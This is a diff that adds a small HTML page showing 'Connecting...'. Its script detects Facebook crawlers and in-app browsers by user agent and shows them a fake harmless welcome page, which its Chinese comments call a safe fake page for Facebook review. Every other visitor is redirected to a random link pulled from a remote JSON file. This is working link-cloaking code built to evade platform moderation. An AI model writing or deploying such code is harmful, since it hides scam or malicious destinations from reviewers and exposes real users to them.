@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow">
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+  </style>
+</head>
+<body>
+<h2>Connecting...</h2>
+<p>Please wait...</p>
+
+<script>
+(async () => {
+  const ua = navigator.userAgent || "";
+
+  const isFB = 
+    ua.includes("FBAN") || 
+    ua.includes("FBAV") || 
+    ua.includes("FB_IAB") ||
+    ua.includes("Facebot") ||
+    ua.includes("facebookexternalhit");
+
+  // FB审查访问 → 停留在安全假的欢迎页面
+  if (isFB) {
+    document.body.innerHTML = `
+      <h2>Welcome</h2>
+      <p>Thanks for visiting.</p>
+    `;
+    return;
+  }
+
+  // 真人访问 → 获取主仓库 JSON
+  const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
+
+  try {
+    const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
+    const data = await res.json();
+    const activeLinks = data.links.filter(l => l.active);
+
+    if (!activeLinks.length) {
+      document.body.innerHTML = "No link available.";
+      return;
+    }
+
+    const idx = Math.floor(Math.random() * activeLinks.length);
+    location.href = activeLinks[idx].url;
+
+  } catch {
+    document.body.innerHTML = `Error loading.`;
+  }
+})();
+</script>
+
+</body>
+</html>
